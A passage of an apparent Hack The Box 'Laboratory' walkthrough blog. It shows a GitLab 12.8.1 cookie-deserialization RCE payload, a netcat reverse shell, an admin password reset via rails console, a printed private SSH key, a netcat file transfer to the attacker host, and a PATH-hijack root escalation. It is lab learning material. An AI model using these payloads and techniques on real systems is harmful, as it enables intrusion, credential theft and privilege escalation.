class="line"></span><br><span class="line">Cookie: experimentation_subject_id=%42%41%68%76%4f%6b%42%42%59%33%52%70%64%6d%56%54%64%58%42%77%62%33%4a%30%4f%6a%70%45%5a%58%42%79%5a%57%4e%68%64%47%6c%76%62%6a%6f%36%52%47%56%77%63%6d%56%6a%59%58%52%6c%5a%45%6c%75%63%33%52%68%62%6d%4e%6c%56%6d%46%79%61%57%46%69%62%47%56%51%63%6d%39%34%65%51%6b%36%44%6b%42%70%62%6e%4e%30%59%57%35%6a%5a%57%38%36%43%45%56%53%51%67%73%36%45%45%42%7a%59%57%5a%6c%58%32%78%6c%64%6d%56%73%4d%44%6f%4a%51%48%4e%79%59%30%6b%69%56%43%4e%6a%62%32%52%70%62%6d%63%36%56%56%52%47%4c%54%67%4b%58%32%56%79%59%6d%39%31%64%43%41%39%49%43%73%6e%4a%7a%73%67%58%32%56%79%59%6d%39%31%64%43%34%38%50%43%67%6f%49%47%42%69%59%58%4e%6f%49%43%39%30%62%58%41%76%63%32%68%6c%62%47%77%75%63%32%68%67%49%43%6b%75%64%47%39%66%63%79%6b%37%49%46%39%6c%63%6d%4a%76%64%58%51%47%4f%67%5a%46%52%6a%6f%4f%51%47%56%75%59%32%39%6b%61%57%35%6e%53%58%55%36%44%55%56%75%59%32%39%6b%61%57%35%6e%43%6c%56%55%52%69%30%34%42%6a%73%4b%52%6a%6f%54%51%47%5a%79%62%33%70%6c%62%6c%39%7a%64%48%4a%70%62%6d%63%77%4f%67%35%41%5a%6d%6c%73%5a%57%35%68%62%57%55%77%4f%67%78%41%62%47%6c%75%5a%57%35%76%61%51%41%36%44%45%42%74%5a%58%52%6f%62%32%51%36%43%33%4a%6c%63%33%56%73%64%44%6f%4a%51%48%5a%68%63%6b%6b%69%44%45%42%79%5a%58%4e%31%62%48%51%47%4f%77%70%55%4f%68%42%41%5a%47%56%77%63%6d%56%6a%59%58%52%76%63%6b%6c%31%4f%68%39%42%59%33%52%70%64%6d%56%54%64%58%42%77%62%33%4a%30%4f%6a%70%45%5a%58%42%79%5a%57%4e%68%64%47%6c%76%62%67%41%47%4f%77%70%55%2d%2d%38%38%34%33%34%38%66%32%62%39%62%32%30%37%61%33%30%32%64%66%32%34%64%32%39%38%61%34%33%63%30%34%30%61%38%64%31%30%32%31; _gitlab_session=64a14454670dfee5793be2a3a7655626; event_filter=all; sidebar_collapsed=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure>
+
+<p>got the initial shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 1234</span></span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::1234</span><br><span class="line">Ncat: Listening on 0.0.0.0:1234</span><br><span class="line">Ncat: Connection from 10.10.10.216.</span><br><span class="line">Ncat: Connection from 10.10.10.216:32992.</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (398): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">git@git:~/gitlab-rails/working$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=998(git) gid=998(git) <span class="built_in">groups</span>=998(git)</span><br><span class="line">git@git:~/gitlab-rails/working$ <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">git</span><br><span class="line">git@git:~/gitlab-rails/working$ <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/var/opt/gitlab/gitlab-rails/working</span><br></pre></td></tr></table></figure>
+
+<h3 id="Resetting-dexter-password"><a href="#Resetting-dexter-password" class="headerlink" title="Resetting dexter password"></a>Resetting dexter password</h3><p>Now since the gitlab is installed i can spawn a gitlab-rails console and reset the admin password , and check who is admin</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmdpdGxhYi5jb20vMTIuMTAvZWUvc2VjdXJpdHkvcmVzZXRfcm9vdF9wYXNzd29yZC5odG1s">How to reset your root password<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git@git:~/gitlab-rails/working$ python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">git@git:~/gitlab-rails/working$ gitlab-rails console</span><br><span class="line">gitlab-rails console</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"> GitLab:       12.8.1 (d18b43a5f5a) FOSS</span><br><span class="line"> GitLab Shell: 11.0.0</span><br><span class="line"> PostgreSQL:   10.12</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">Loading production environment (Rails 6.0.2)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>username</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">irb(main):001:0&gt; user = User.<span class="built_in">where</span>(<span class="built_in">id</span>: 1).first</span><br><span class="line">user = User.<span class="built_in">where</span>(<span class="built_in">id</span>: 1).first</span><br><span class="line">user = User.<span class="built_in">where</span>(<span class="built_in">id</span>: 1).first</span><br><span class="line">=&gt; <span class="comment">#&lt;User id:1 @dexter&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>So the admin user is dexter , the user i saw on the laboratory.htb web page</p>
+<ul>
+<li>password</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">irb(main):002:0&gt; user.password = <span class="string">&#x27;secret_pass&#x27;</span></span><br><span class="line">user.password = <span class="string">&#x27;secret_pass&#x27;</span></span><br><span class="line">user.password = <span class="string">&#x27;secret_pass&#x27;</span></span><br><span class="line">=&gt; <span class="string">&quot;secret_pass&quot;</span></span><br><span class="line">irb(main):003:0&gt; user.password_confirmation = <span class="string">&#x27;secret_pass&#x27;</span></span><br><span class="line">user.password_confirmation = <span class="string">&#x27;secret_pass&#x27;</span></span><br><span class="line">user.password_confirmation = <span class="string">&#x27;secret_pass&#x27;</span></span><br><span class="line">=&gt; <span class="string">&quot;secret_pass&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>and saving the edits</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">irb(main):004:0&gt; user.save!</span><br><span class="line">user.save!</span><br><span class="line">user.save!</span><br><span class="line">Enqueued ActionMailer::DeliveryJob (Job ID: 1457daea-259d-4e8e-8351-e121b5fdc5cd) to Sidekiq(mailers) with arguments: <span class="string">&quot;DeviseMailer&quot;</span>, <span class="string">&quot;password_change&quot;</span>, <span class="string">&quot;deliver_now&quot;</span>, <span class="comment">#&lt;GlobalID:0x00007fdc4d4d2ae8 @uri=#&lt;URI::GID gid://gitlab/User/1&gt;&gt;</span></span><br><span class="line">=&gt; <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Login-as-dexter-on-gitlab"><a href="#Login-as-dexter-on-gitlab" class="headerlink" title="Login as dexter on gitlab"></a>Login as dexter on gitlab</h3><p>Now i can login as</p>
+<p>dexter : secret_pass</p>
+<p>There is a repo called secureDocker</p>
+<p>There is some personal stuff is saved by the dexter , even the script to create the gitlab lab</p>
+<p>And in the folder dexter there is another folder .ssh in which private ssh keys are stored</p>
+<p>I get the keys and used them to login myself as dexter using ssh</p>
+<p>authorized_keys:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCxl8OPcBJ1vlhLczCOwPz7km+d6VSz7IjbtW4MPs/bWh1J81SAIK2hIT6/yw81oH/EXQJWpAe2eGdZ7qd3FdYfBvfhROh2rqDac6W+05D0hPFJ68NJwz9y0jqHjZ0UGGz7xxb25LE7CUVHhvvQT62/cEzdahaDCle+C4/a5kXhJQ1Yr/x2z1PFhboLVaQALxnbkzse0td/Va5dT/aOfDb1vODM7ikk+8wdTFdXA3zf2MBOBCU2nn25AMFSJxd7Can/klIus49BKQOsRgCckwHh/1E13JsLoS+ZeyBL1+jgsbKFIC4W1PU6OrI5jW7AsZakviNwPEqJ+4Iw8t/mClJAe/DR+rr+EXhKmoziJcMZjunnbB7Qp6TeE/QOpC0S+7EJrvCmfcjW0qw2ZqCdd2oHeQirloRsZIRJthMBS+HjmDDaCTSX7dOw7NZWjCxomrmQLIObjHR+DwF9w+SQp+KL0qc0qyd1cgfSuDRCWU+MAL9kaGyNZJEbj2s/Kh9diu8= root@laboratory</span><br></pre></td></tr></table></figure>
+
+<p>id_rsa:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAsZfDj3ASdb5YS3MwjsD8+5JvnelUs+yI27VuDD7P21odSfNUgCCt</span><br><span class="line">oSE+v8sPNaB/xF0CVqQHtnhnWe6ndxXWHwb34UTodq6g2nOlvtOQ9ITxSevDScM/ctI6h4</span><br><span class="line">2dFBhs+8cW9uSxOwlFR4b70E+tv3BM3WoWgwpXvguP2uZF4SUNWK/8ds9TxYW6C1WkAC8Z</span><br><span class="line">25M7HtLXf1WuXU/2jnw29bzgzO4pJPvMHUxXVwN839jATgQlNp59uQDBUicXewmp/5JSLr</span><br><span class="line">OPQSkDrEYAnJMB4f9RNdybC6EvmXsgS9fo4LGyhSAuFtT1OjqyOY1uwLGWpL4jcDxKifuC</span><br><span class="line">MPLf5gpSQHvw0fq6/hF4SpqM4iXDGY7p52we0Kek3hP0DqQtEvuxCa7wpn3I1tKsNmagnX</span><br><span class="line">dqB3kIq5aEbGSESbYTAUvh45gw2gk0l+3TsOzWVowsaJq5kCyDm4x0fg8BfcPkkKfii9Kn</span><br><span class="line">NKsndXIH0rg0QllPjAC/ZGhsjWSRG49rPyofXYrvAAAFiDm4CIY5uAiGAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBALGXw49wEnW+WEtzMI7A/PuSb53pVLPsiNu1bgw+z9taHUnzVIAgraEhPr/LDzWg</span><br><span class="line">f8RdAlakB7Z4Z1nup3cV1h8G9+FE6HauoNpzpb7TkPSE8Unrw0nDP3LSOoeNnRQYbPvHFv</span><br><span class="line">bksTsJRUeG+9BPrb9wTN1qFoMKV74Lj9rmReElDViv/HbPU8WFugtVpAAvGduTOx7S139V</span><br><span class="line">rl1P9o58NvW84MzuKST7zB1MV1cDfN/YwE4EJTaefbkAwVInF3sJqf+SUi6zj0EpA6xGAJ</span><br><span class="line">yTAeH/UTXcmwuhL5l7IEvX6OCxsoUgLhbU9To6sjmNbsCxlqS+I3A8Son7gjDy3+YKUkB7</span><br><span class="line">8NH6uv4ReEqajOIlwxmO6edsHtCnpN4T9A6kLRL7sQmu8KZ9yNbSrDZmoJ13agd5CKuWhG</span><br><span class="line">xkhEm2EwFL4eOYMNoJNJft07Ds1laMLGiauZAsg5uMdH4PAX3D5JCn4ovSpzSrJ3VyB9K4</span><br><span class="line">NEJZT4wAv2RobI1kkRuPaz8qH12K7wAAAAMBAAEAAAGAH5SDPBCL19A/VztmmRwMYJgLrS</span><br><span class="line">L+4vfe5mL+7MKGp9UAfFP+5MHq3kpRJD3xuHGQBtUbQ1jr3jDPABkGQpDpgJ72mWJtjB1F</span><br><span class="line">kVMbWDG7ByBU3/ZCxe0obTyhF9XA5v/o8WTX2pOUSJE/dpa0VLi2huJraLwiwK6oJ61aqW</span><br><span class="line">xlZMH3+5tf46i+ltNO4BEclsPJb1hhHPwVQhl0Zjd/+ppwE4bA2vBG9MKp61PV/C0smYmr</span><br><span class="line">uLPYAjxw0uMlfXxiGoj/G8+iAxo2HbKSW9s4w3pFxblgKHMXXzMsNBgePqMz6Xj9izZqJP</span><br><span class="line">jcnzsJOngAeFEB/FW8gCOeCp2FmP4oL08+SknvEUPjWM+Wl/Du0t6Jj8s9yqNfpqLLbJ+h</span><br><span class="line">1gQdZxxHeSlTCuqnat4khVUJ8zZlBz7B9xBE7eItdAVmGcrM9ztz9DsrLVTBLzIjfr29my</span><br><span class="line">7icbK30MnPBbFKg82AVDPdzl6acrKMnV0JTm19JnDrvWZD924rxpFCXDDcfAWgDr2hAAAA</span><br><span class="line">wCivUUYt2V62L6PexreXojzD6aZMm2qZk6e3i2pGJr3sL49C2qNOY9fzDjCOyNd8S5fA14</span><br><span class="line">9uNAEMtgMdxYrZZAu8ymwV9dXfI6x7V8s+8FCOiU2+axL+PBSEpsKEzlK37+iZ3D1XgYgM</span><br><span class="line">4OYqq39p4wi8rkEaNVuJKYFo8FTHWVcKs3Z/y0NVGhPeaaQw3cAHjUv//K0duKA/m/hW8T</span><br><span class="line">WVAs1IA5kND4sDrNOybRWhPhzLonJKhceVveoDsnunSw/vLgAAAMEA5+gJm0gypock/zbc</span><br><span class="line">hjTa+Eb/TA7be7s2Ep2DmsTXpKgalkXhxdSvwiWSYk+PHj0ZO9BPEx9oQGW01EFhs1/pqK</span><br><span class="line">vUOZ07cZPMI6L1pXHAUyH3nyw56jUj2A3ewGOd3QoYDWS+MMSjdSgiHgYhO09xX4LHf+<span class="built_in">wc</span></span><br><span class="line">N2l+RkOEv7ZbOQedBxb+4Zhw+sgwIFVdLTblQd+JL4HIkNZyNXv0zOnMwE5jMiEbJFdhXg</span><br><span class="line">LOCTp45CWs7aLIwkxBPN4SIwfcGfuXAAAAwQDECykadz2tSfU0Vt7ge49Xv3vUYXTTMT7p</span><br><span class="line">7a8ryuqlafYIr72iV/ir4zS4VFjLw5A6Ul/xYrCud0OIGt0El5HmlKPW/kf1KeePfsHQHS</span><br><span class="line">JP4CYgVRuNmqhmkPJXp68UV3djhA2M7T5j31xfQE9nEbEYsyRELOOzTwnrTy/F74dpk/pq</span><br><span class="line">XCVyJn9QMEbE4fdpKGVF+MS/CkfE+JaNH9KOLvMrlw0bx3At681vxUS/VeISQyoQGLw/fu</span><br><span class="line">uJvh4tAHnotmkAAAAPcm9vdEBsYWJvcmF0b3J5AQIDBA==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<h3 id="Login-as-dexter"><a href="#Login-as-dexter" class="headerlink" title="Login as dexter"></a>Login as dexter</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/laboratory<span class="comment"># ssh -i id_rsa dexter@10.10.10.216</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;10.10.10.216 (10.10.10.216)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:XexmI3GbFIB7qyVRFDIYvKcLfMA9pcV9LeIgJO5KQaA.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.10.10.216<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">dexter@laboratory:~$ id</span></span><br><span class="line"><span class="string">uid=1000(dexter) gid=1000(dexter) groups=1000(dexter)</span></span><br><span class="line"><span class="string">dexter@laboratory:~$ whoami</span></span><br><span class="line"><span class="string">dexter</span></span><br><span class="line"><span class="string">dexter@laboratory:~$ ls</span></span><br><span class="line"><span class="string">user.txt</span></span><br><span class="line"><span class="string">dexter@laboratory:~$ cat user.txt</span></span><br><span class="line"><span class="string">ab8b7d004b302b6d6d083d1da8d815a4</span></span><br></pre></td></tr></table></figure>
+
+<p>and we got user.txt</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb123.jpg"></li>
+</ul>
+<h3 id="Privilege-Escalation-to-root"><a href="#Privilege-Escalation-to-root" class="headerlink" title="Privilege Escalation to root"></a>Privilege Escalation to root</h3><p>Now its time for priv esc , run LinEnum.sh to check for possible things to escalate</p>
+<p>And got this somewhere in the output</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] Possibly interesting SUID files:                                                                     </span><br><span class="line">-rwsr-xr-x 1 root dexter 16720 Aug 28 14:52 /usr/local/bin/docker-security</span><br></pre></td></tr></table></figure>
+
+<p>I Run the binary , but it shows nothing</p>
+<p>so i run pspy on the other hand and then run this binary and i saw some process running after running the docker-security</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2020/11/17 07:10:34 CMD: UID=0    PID=77936  | /usr/local/bin/docker-security </span><br><span class="line">2020/11/17 07:10:34 CMD: UID=0    PID=77938  | sh -c <span class="built_in">chmod</span> 700 /usr/bin/docker </span><br><span class="line">2020/11/17 07:10:34 CMD: UID=0    PID=77939  | sh -c <span class="built_in">chmod</span> 660 /var/run/docker.sock </span><br><span class="line">2020/11/17 07:10:34 CMD: UID=0    PID=77940  | sh -c <span class="built_in">chmod</span> 660 /var/run/docker.sock</span><br></pre></td></tr></table></figure>
+
+<p>Its using chmod without specifying the full path &#x2F;usr&#x2F;bin&#x2F;chmod</p>
+<p>This type of thing can be exploited with Path-Hijacking</p>
+<p>To confirm this downloaded the docker-security in my system and opened it with radare2</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dexter@laboratory:/usr/local/bin$ nc 10.10.14.3 10086 &lt; docker-security</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/laboratory<span class="comment"># nc -l 10086 &gt; docker-security</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/laboratory<span class="comment"># r2 docker-security</span></span><br><span class="line">[0x00001070]&gt; s main</span><br><span class="line">[0x00001155]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>open the visual mode</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0x00001155]&gt; v</span><br></pre></td></tr></table></figure>
+
+<p>Now looking at the main function</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb124.jpg"></li>
+</ul>
+<p>I can see that the binary is executing chmod without the full path</p>
+<h3 id="Path-Hijacking"><a href="#Path-Hijacking" class="headerlink" title="Path-Hijacking"></a>Path-Hijacking</h3><p>Since i know that docker-security is using chmod without specifying it full path , This is kind of similar to my writeup on magic priv esc</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly8weHByYXNoYW50LmdpdGh1Yi5pby9wb3N0cy9odGItbWFnaWMvI3ByaXZpbGVnZS1lc2NhbGF0aW9uLXRvLXJvb3Q=">Hackthebox Magic writeup<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>making a new shell script named chmod</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dexter@laboratory:~$ <span class="built_in">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt;&gt; <span class="built_in">chmod</span></span><br><span class="line">dexter@laboratory:~$ <span class="built_in">cat</span> <span class="built_in">chmod</span> </span><br><span class="line">/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>If this got executed by root it will give us a bash shell as root<br>export the PATH to script dir</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dexter@laboratory:~$ <span class="built_in">export</span> PATH=$(<span class="built_in">pwd</span>):<span class="variable">$PATH</span></span><br><span class="line">dexter@laboratory:~$ <span class="built_in">chmod</span> +x <span class="built_in">chmod</span></span><br></pre></td></tr></table></figure>
+
+<p>run the docker-security,and we got root:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">dexter@laboratory:~$ /usr/local/bin/docker-security</span><br><span class="line">root@laboratory:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),1000(dexter)</span><br><span class="line">root@laboratory:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@laboratory:~<span class="comment"># cd ~</span></span><br><span class="line">root@laboratory:~<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">chmod</span>  user.txt</span><br><span class="line">root@laboratory:~<span class="comment"># cd /root</span></span><br><span class="line">root@laboratory:/root<span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">root@laboratory:/root<span class="comment"># cat root.txt</span></span><br><span class="line">f6ba2567a8c309e3184f81fdca6dc37c</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb125.jpg"></li>
+</ul>
+<h4 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h4><ul>
+<li>GitLab Community Edition 12.8.1 Arbitrary file read via the UploadsRewriter</li>
+<li>GitLab Community Edition 12.8.1 Arbitrary file read RCE via gitlab-rails console generated payload cookies</li>
+<li>gitlab-rails console reset password</li>
+<li>Path-Hijacking via &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-security</li>
+</ul>
+<h4 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h4><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2020/11/22/laboratory/" title="Hack-The-Box-walkthrough[laboratory]">https://fdlucifer.github.io/2020/11/22/laboratory/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/11/14/academy/" rel="prev" title="Hack-The-Box-walkthrough[academy]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[academy]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/11/28/crossfit/" rel="next" title="Hack-The-Box-walkthrough[crossfit]">
+                  Hack-The-Box-walkthrough[crossfit] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
